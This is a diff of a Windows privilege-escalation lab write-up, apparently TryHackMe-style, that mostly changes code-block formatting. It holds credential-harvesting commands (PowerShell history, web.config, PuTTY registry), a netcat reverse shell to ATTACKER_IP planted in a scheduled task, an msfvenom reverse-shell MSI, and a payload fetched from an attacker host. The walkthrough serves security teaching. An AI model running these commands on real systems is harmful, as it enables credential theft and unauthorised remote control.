@@ -77,7 +77,9 @@ As part of these files, you might encounter credentials:
 
 Whenever a user runs a command using Powershell, it gets stored into a file that keeps a memory of past commands. This is useful for repeating commands you have used before quickly. If a user runs a command that includes a password directly as part of the Powershell command line, it can later be retrieved by using the following command from a cmd.exe prompt:
 
-`type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt`
+```bash
+type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
+```
 
 Note: The command above will only work from cmd.exe, as Powershell won't recognize `%userprofile%` as an environment variable. To read the file from Powershell, you'd have to replace `%userprofile%` with `$Env:userprofile`. 
 
@@ -100,7 +102,9 @@ Internet Information Services (IIS) is the default web server on Windows install
 - C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
 Here is a quick way to find database connection strings on the file:
 
-`type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString`
+```bash
+type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString
+```
 
 ## Retrieve Credentials from Software: PuTTY
 
@@ -108,7 +112,9 @@ PuTTY is an SSH client commonly found on Windows systems. Instead of having to s
 
 To retrieve the stored proxy credentials, you can search under the following registry key for ProxyPassword with the following command:
 
-`reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s`
+```bash
+reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
+```
 
 Note: Simon Tatham is the creator of PuTTY (and his name is part of the path), not the username for which we are retrieving the password. The stored proxy username should also be visible after running the command above.
 
@@ -126,7 +132,7 @@ Looking into scheduled tasks on the target system, you may see a scheduled task 
 
 Scheduled tasks can be listed from the command line using the `schtasks` command without any options. To retrieve detailed information about any of the services, you can use a command like the following one:
 
-```py
+```bash
 schtasks /query /tn vulntask /fo list /v
 Folder: \
 HostName:                             THM-PC1
@@ -139,7 +145,7 @@ You will get lots of information about the task, but what matters for us is the 
 
 If our current user can modify or overwrite the "Task to Run" executable, we can control what gets executed by the taskusr1 user, resulting in a simple privilege escalation. To check the file permissions on the executable, we use `icacls`:
 
-```py
+```bash
 icacls c:\tasks\schtask.bat
 c:\tasks\schtask.bat NT AUTHORITY\SYSTEM:(I)(F)
                     BUILTIN\Administrators:(I)(F)
@@ -148,7 +154,7 @@ c:\tasks\schtask.bat NT AUTHORITY\SYSTEM:(I)(F)
 
 As can be seen in the result, the BUILTIN\Users group has full access (F) over the task's binary. This means we can modify the .bat file and insert any payload we like. For your convenience, nc64.exe can be found on C:\tools. Let's change the bat file to spawn a reverse shell:
 
-```py
+```bash
 C:\> echo c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 4444 > C:\tasks\schtask.bat
 ```
 
@@ -167,13 +173,15 @@ Windows installer files (also known as `.msi` files) are used to install applica
 
 This method requires two registry values to be set. You can query these from the command line using the commands below.
 
-```py
+```bash
 C:\> reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
 C:\> reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
 ```
 To be able to exploit this vulnerability, both should be set. Otherwise, exploitation will not be possible. If these are set, you can generate a malicious .msi file using msfvenom, as seen below:
 
-`msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKING_10.10.145.3 LPORT=LOCAL_PORT -f msi -o malicious.msi`
+```bash
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKING_10.10.145.3 LPORT=LOCAL_PORT -f msi -o malicious.msi
+```
 
 As this is a reverse shell, you should also run the Metasploit Handler module configured accordingly. Once you have transferred the file you have created, you can run the installer with the command below and receive the reverse shell:
 
@@ -189,7 +197,7 @@ Each service on a Windows machine will have an associated executable which will 
 
 To better understand the structure of a service, let's check the apphostsvc service configuration with the sc qc command:
 
-```py
+```bash
 C:\> sc qc apphostsvc
 [SC] QueryServiceConfig SUCCESS
 
@@ -226,7 +234,7 @@ If the executable associated with a service has weak permissions that allow an a
 
 To understand how this works, let's look at a vulnerability found on Splinterware System Scheduler. To start, we will query the service configuration using sc:
 
-```py
+```bash
 C:\> sc qc WindowsScheduler
 [SC] QueryServiceConfig SUCCESS
 
@@ -244,7 +252,7 @@ SERVICE_NAME: windowsscheduler
 
 We can see that the service installed by the vulnerable software runs as `svcuser1` and the executable associated with the service is in `C:\Progra~2\System~1\WService.exe.` We then proceed to check the permissions on the executable:
 
-```py
+```bash
 C:\Users\thm-unpriv>icacls C:\PROGRA~2\SYSTEM~1\WService.exe
 C:\PROGRA~2\SYSTEM~1\WService.exe Everyone:(I)(M)
                                   NT AUTHORITY\SYSTEM:(I)(F)
@@ -268,12 +276,12 @@ Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
 ```
 We can then pull the payload from Powershell with the following command:
 
-```py
+```bash
 wget http://ATTACKER_IP:8000/rev-svc.exe -O rev-svc.exe
 ```
 
 Once the payload is in the Windows server, we proceed to replace the service executable with our payload. Since we need another user to execute our payload, we'll want to grant full permissions to the Everyone group as well:
-```py
+```bash
 C:\> cd C:\PROGRA~2\SYSTEM~1\
 
 C:\PROGRA~2\SYSTEM~1> move WService.exe WService.exe.bkp
@@ -291,7 +299,7 @@ Kali Linux
 user@attackerpc$ nc -lvp 4445
 ```
 And finally, restart the service. While in a normal scenario, you would likely have to wait for a service restart, you have been assigned privileges to restart the service yourself to save you some time. Use the following commands from a cmd.exe command prompt:
-```py
+```bash
 C:\> sc stop windowsscheduler
 C:\> sc start windowsscheduler
 ```
